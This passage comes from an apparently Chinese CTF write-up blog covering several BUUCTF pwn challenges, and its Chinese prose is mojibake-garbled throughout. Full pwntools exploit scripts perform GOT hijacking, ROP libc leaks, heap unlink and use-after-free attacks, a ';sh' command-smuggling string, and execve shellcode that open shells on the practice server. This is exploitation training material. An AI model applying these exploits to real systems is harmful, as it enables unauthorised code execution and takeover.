class="hljs-number">0x8</span>,p64(<span class="hljs-number">0</span>)+p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(og)+p64(base+libc.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]+<span class="hljs-number">14</span>))<br>add(<span class="hljs-number">0x66</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><p>0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066</p><h3 id="bbbabyï¼š">bbbabyï¼š</h3><p>åŠ«æŒ__stack_chk_failçš„gotä¸ºmainï¼Œæ‰§è¡Œæˆ‘ä»¬ropé“¾æ³„éœ²libcï¼Œå†åŠ«æŒatoiçš„gotä¸ºsystem</p><p>å†™å…¥bin/sh</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs vim">from pwn import *<br>#from LibcSearcher import * <br>local_file  = <span class="hljs-string">&#x27;./pwn1&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>#remote_libc = <span class="hljs-string">&#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29156</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br><span class="hljs-keyword">se</span>      = lambda data               :r.send(data)<br><span class="hljs-keyword">sa</span>      = lambda delim,data         :r.sendafter(delim, data)<br><span class="hljs-keyword">sl</span>      = lambda data               :r.sendline(data)<br><span class="hljs-keyword">sla</span>     = lambda delim,data         :r.sendlineafter(delim, data)<br>sea     = lambda delim,data         :r.sendafter(delim, data)<br>rc      = lambda numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = lambda                    :r.recvline()<br><span class="hljs-keyword">ru</span>      = lambda delims                         :r.recvuntil(delims)<br>uu32    = lambda data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = lambda data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = lambda <span class="hljs-keyword">tag</span>, addr        :r.info(<span class="hljs-keyword">tag</span> + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.format(addr))<br>o_g_32_old = [<span class="hljs-number">0</span>x3ac3c, <span class="hljs-number">0</span>x3ac3e, <span class="hljs-number">0</span>x3ac42, <span class="hljs-number">0</span>x3ac49, <span class="hljs-number">0</span>x5faa5, <span class="hljs-number">0</span>x5faa6]<br>o_g_32 = [<span class="hljs-number">0</span>x3ac6c, <span class="hljs-number">0</span>x3ac6e, <span class="hljs-number">0</span>x3ac72, <span class="hljs-number">0</span>x3ac79, <span class="hljs-number">0</span>x5fbd5, <span class="hljs-number">0</span>x5fbd6]<br>o_g_old = [<span class="hljs-number">0</span>x45216,<span class="hljs-number">0</span>x4526a,<span class="hljs-number">0</span>xf02a4,<span class="hljs-number">0</span>xf1147]<br>o_g = [<span class="hljs-number">0</span>x45226, <span class="hljs-number">0</span>x4527a, <span class="hljs-number">0</span>xf0364, <span class="hljs-number">0</span>xf1207]<br>def <span class="hljs-keyword">debug</span>(cmd=<span class="hljs-string">&#x27;&#x27;</span>):<br>     gdb.attach(r,cmd)<br>#------------------------------<br>pop_rdi=<span class="hljs-number">0</span>x400a03<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;your choice\n&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;address:\n&#x27;</span>,str(elf.got[<span class="hljs-string">&#x27;__stack_chk_fail&#x27;</span>]))<br><span class="hljs-keyword">sa</span>(<span class="hljs-string">&#x27;content:\n&#x27;</span>,p64(<span class="hljs-number">0</span>x40090b))<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;your choice\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x110+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(<span class="hljs-number">0</span>x40090b)<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;size:\n&#x27;</span>,str(<span class="hljs-built_in">len</span>(payload)))<br><span class="hljs-keyword">sa</span>(<span class="hljs-string">&#x27;content:\n&#x27;</span>,payload)<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;your choice\n&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;your choice\n&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>libc_base=uu64(<span class="hljs-keyword">ru</span>(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-keyword">print</span> hex(libc_base)<br><span class="hljs-built_in">system</span>=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;your choice\n&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;address:\n&#x27;</span>,str(elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]))<br><span class="hljs-keyword">sa</span>(<span class="hljs-string">&#x27;content:\n&#x27;</span>,p64(<span class="hljs-built_in">system</span>))<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;your choice\n&#x27;</span>,<span class="hljs-string">&#x27;/bin\sh\x00&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>å…¶ä»–ï¼š</p><p>å¡«å…¥payloadåï¼Œç¬¬ä¸€ä¸ª2ç»“æŸåŸæœ¬çš„main</p><p>ç¬¬äºŒä¸ªäºŒç»“æŸ__stack_chk_failçš„mainï¼Œå†æ‰§è¡Œropé“¾é‡Œçš„putsï¼Œå†è¿”å›main</p><p>ï¼ˆæˆ‘çŒœï¼‰</p><h3 id="hitcon2014-stkof">hitcon2014_stkof</h3><p>å‚è€ƒå¸ˆå‚…ï¼š<a href="https://blog.csdn.net/qq_41202237/article/details/108481889">(4æ¡æ¶ˆæ¯) å¥½å¥½è¯´è¯ä¹‹unlink_hollkâ€™s blog-CSDNåšå®¢_å¥½å¥½è¯´è¯ä¹‹unlink</a></p><p><strong>åˆ©ç”¨æ–¹æ³•</strong>ï¼šå †æº¢å‡º-&gt;ä¼ªé€ chunk-&gt;unlink-&gt;åŠ«æŒgot-&gt;æ³„éœ²libcåœ°å€-&gt;å¼€shell</p><p><strong>å…·ä½“æ­¥éª¤</strong>ï¼š(ä¹Ÿä¸å…·ä½“ï¼Œä¸æ˜¯å¾ˆæ‡‚ï¼Œå…·ä½“å‚è€ƒä¸Šé¢é‚£ä½å¸ˆå‚…   orz  )</p><p>1.ç”³è¯·4ä¸ªå †å—</p><p>0x20ï¼ˆä»»æ„å¤§å°ï¼Œç”±äºæœ¬é¢˜æ²¡æœ‰setbufå‡½æ•°ï¼Œè¿™ä¸ªchunkè¢«å¤¹åœ¨ä¸¤ä¸ªä¸ºç¼“å†²åŒºç”³è¯·çš„å—ä¸­ï¼Œä¸å¥½å¤„ç†ï¼‰</p><p>0x30ï¼ˆè‡³å°‘ä¸º0x30ï¼Œä¸ºèƒ½ç»•è¿‡æ£€æŸ¥,0x8(prev_size) + 0x8(size) + 0x8(fd) + 0x8(bk) + 0x8(next_prev) + 0x8(next_size) = 0x30ï¼Œè¿™é‡Œfdï¼Œbkæ„é€ æœ€ä¸ºç²¾å·§ï¼‰</p><p>0x80ï¼ˆè‡³å°‘ä¸º0x80ï¼Œèƒ½åˆ†é…åˆ°unsortbinï¼‰</p><p>0x30ï¼ˆä»»æ„å¤§å°ï¼Œé˜²æ­¢ä¸topchunkåˆå¹¶ï¼‰</p><p>2.å †æº¢å‡ºä¼ªé€ ä¸€ä¸ªchunkï¼Œè®©ç³»ç»Ÿä»¥ä¸ºå®ƒæ˜¯ç©ºé—²çš„chunkï¼Œç„¶åfreeè§¦å‘unlinkï¼Œæœ€åå°±æ˜¯åœ¨bssæ®µé‡Œå­˜chunkæŒ‡é’ˆçš„ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘è¿™ä¸ªbssæ®µï¼Œè¿™é¢˜é‡Œæ”¹chunk2æŒ‡é’ˆçš„åœ°å€æŒ‡å‘ï¼Œgolobal[0]=free_got ,golobal[1]=puts_gotï¼Œä¿®æ”¹chunk1ï¼Œå°±æ˜¯æ”¹golobal[0]æŒ‡å‘çš„free_goté‡Œçš„å†…å®¹ä¸ºputs_pltï¼Œè°ƒç”¨freeå°±ä¼šè°ƒç”¨putsï¼Œfreeï¼ˆ2ï¼‰å³putsï¼ˆputs_gotï¼‰å°±æ³„éœ²äº†libcåœ°å€</p><p>3.å¾—å‡ºsystemåœ°å€åï¼Œé‡å¤ä¸Šè¿°æ­¥éª¤ï¼Œæ”¹free_gotä¸ºsystemåœ°å€ï¼Œå¹¶å¡«å…¥/bin/shï¼Œå¼€shell</p><p><strong>chunkçŠ¶æ€æ£€æŸ¥</strong>ï¼š</p><p><strong>æ£€æŸ¥1</strong>ï¼šæ£€æŸ¥ä¸è¢«é‡Šæ”¾chunkç›¸é‚»é«˜åœ°å€çš„chunkçš„prevsizeçš„å€¼æ˜¯å¦ç­‰äºè¢«é‡Šæ”¾chunkçš„sizeå¤§å°</p><p><strong>æ£€æŸ¥2</strong>ï¼šæ£€æŸ¥ä¸è¢«é‡Šæ”¾chunkç›¸é‚»é«˜åœ°å€çš„chunkçš„sizeçš„Pæ ‡å¿—ä½æ˜¯å¦ä¸º0</p><p><strong>æ£€æŸ¥3</strong>ï¼šæ£€æŸ¥å‰åè¢«é‡Šæ”¾chunkçš„fdå’Œbk</p><p>ä»¥ä¸Šä¸‰ç‚¹å°±æ˜¯æ£€æŸ¥chunkæ˜¯å¦ç©ºé—²çš„ä¸‰å¤§æ ‡å‡†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./stkof&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25134</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                     :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    r.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    r.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,strings</span>):<br>    r.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br>    r.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(strings)))<br>    r.send(strings)<br>    r.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br><br><span class="hljs-comment">#------------------------------------------------------</span><br>target = <span class="hljs-number">0x602140</span><br>fd = target-<span class="hljs-number">0x8</span><br>bk = target<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br>add(<span class="hljs-number">0x20</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#3 </span><br>add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#4</span><br>pd1=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x30</span>)+p64(fd)+p64(bk)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0x90</span>)<br>edit(<span class="hljs-number">2</span>,pd1)<br>free(<span class="hljs-number">3</span>)<br>pd2=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(free_got)+p64(puts_got)<br>edit(<span class="hljs-number">2</span>,pd2)<br>edit(<span class="hljs-number">1</span>,p64(puts_plt))<br>free(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#debug()</span><br>putgot=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(putgot)<br><span class="hljs-comment">#--------------------------------------------------------</span><br>obj=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,putgot)<br>base=putgot-obj.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br><span class="hljs-comment">#print hex(base)</span><br>system=base+obj.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-comment">#binsh=base+obj.dump(&quot;str_bin_sh&quot;)</span><br>edit(<span class="hljs-number">1</span>,p64(system))<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">4</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="pwnable-hacknote">pwnable_hacknote</h3><p>å‚è€ƒå¸ˆå‚…ï¼š[<a href="https://www.cnblogs.com/xlrp/p/14273598.html">BUUCTF]PWNâ€”â€”pwnable_hacknote - Angel-Yan - åšå®¢å›­ (cnblogs.com)</a></p><p>è¿™é¢˜å †çš„ç»“æ„å¾ˆç‰¹åˆ«</p><p>åˆ©ç”¨æ–¹æ³•ï¼šå…ˆé‡Šæ”¾ä¸¤ä¸ªchunkï¼Œå†ç”³è¯·0x8å¤§å°ï¼Œä¼šç”³è¯·é‚£ä¸¤ä¸ªç»“æ„0x10çš„noteå—ï¼Œèƒ½æ”¹åä¸€ä¸ªnoteå—çš„å†…å®¹ï¼Œæ”¹ä¸ºgotè¡¨ï¼Œç”±äºæœ¬é¢˜çš„uafï¼ŒæŒ‡é’ˆæœªç½®0ï¼Œè¿˜èƒ½ç»§ç»­è°ƒç”¨åŸæœ¬çš„chunkï¼Œå°±æ³„éœ²äº†åœ°å€ï¼Œç±»ä¼¼æ­¥éª¤æ”¹noteå—é‡Œputå‡½æ•°ä¸ºsystemï¼Œåä¸€ä¸ªå¡«/bin/shï¼Œâ€œä½†æ˜¯è¿™æ ·å¤±è´¥äº†ä½†æ˜¯ä½¿ç”¨è¿ç»­æ‰§è¡Œå¤šæ¡å‘½ä»¤çš„â€™ ; â€˜ï¼Œç¬¬ä¸€æ¡æ‰§è¡Œé”™è¯¯ä¼šè¢«å¿½ç•¥ï¼Œç„¶åæ‰§è¡Œä¸‹ä¸€æ¡ï¼Œå› æ­¤å¯ä»¥æˆåŠŸå°†contentä½ç½®è¦†ç›–æˆ â€˜;sh\0â€™æˆ–||shï¼ŒåŒæ ·çš„ç„¶åshowï¼ˆchunk1ï¼‰å°±èƒ½æ‰§è¡Œsystemï¼ˆâ€˜shâ€™ï¼‰å¾—åˆ°shelläº†â€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./hacknote&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/root/glibc-all-in-onebsubc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27024</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#---------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>        ru(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>        sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br>        ru(<span class="hljs-string">&#x27;Note size :&#x27;</span>)<br>        sl(<span class="hljs-built_in">str</span>(size))<br>        ru(<span class="hljs-string">&#x27;Content :&#x27;</span>)<br>        sl(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>        ru(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>        sl(<span class="hljs-string">&#x27;2&#x27;</span>)<br>        ru(<span class="hljs-string">&#x27;Index :&#x27;</span>)<br>        sl(<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>        ru(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>        sl(<span class="hljs-string">&#x27;3&#x27;</span>)<br>        ru(<span class="hljs-string">&#x27;Index :&#x27;</span>)<br>        sl(<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#----------------------------------------------</span><br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<span class="hljs-comment">#1</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">8</span>,p32(<span class="hljs-number">0x804862b</span>)+p32(puts_got))<span class="hljs-comment">#2</span><br>show(<span class="hljs-number">1</span>)<br>puts_addr = u32(rc(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts_addr)<br>base=puts_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">8</span>,p32(system)+<span class="hljs-string">&#x27;;sh\0&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>show(<span class="hljs-number">1</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-s-9">ciscn_2019_s_9</h3><p>è¿™é¢˜æ²¡å¼€nxï¼Œç›´æ¥æ ˆæº¢å‡ºå†™shellcode</p><p>ä½†æº¢å‡ºåªæœ‰50-0x20-4=10</p><p>æ‰€ä»¥æ ˆä¸­å…ˆå¡«shellcodeï¼Œè¿”å›åœ°å€å¡«å…¥æœ¬é¢˜ä¸­æœ‰çš„jmp_espï¼Œç„¶åå†esp-40åˆ°call espå‘½ä»¤å¤„ï¼Œæ‰§è¡Œshellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#r=process(&#x27;./ciscn_s_9&#x27;)</span><br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26224</span>)<br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>sc=<span class="hljs-string">&#x27;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&#x27;</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">len</span>(sc)<br>jmp_esp=<span class="hljs-number">0x08048554</span><br>call=asm(<span class="hljs-string">&#x27;sub 